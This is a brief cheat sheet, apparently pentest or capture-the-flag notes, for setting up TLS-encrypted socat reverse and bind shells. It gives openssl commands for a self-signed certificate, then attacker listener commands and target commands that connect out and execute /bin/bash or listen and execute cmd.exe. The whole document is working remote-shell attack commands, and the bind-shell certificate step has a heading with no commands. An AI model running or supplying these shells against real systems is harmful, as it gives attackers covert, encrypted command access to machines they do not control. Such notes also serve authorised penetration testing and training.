# REVERSE SHELL

1. GENERATE A CERT AND KEY

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

2. Merge key and cert

cat shell.key shell.crt > shell.pem

ATTACKER:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

TARGET:

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

# BIND SHELL

1. GENERATE A CERT AND KEY

TARGET:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

ATTACKER:
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -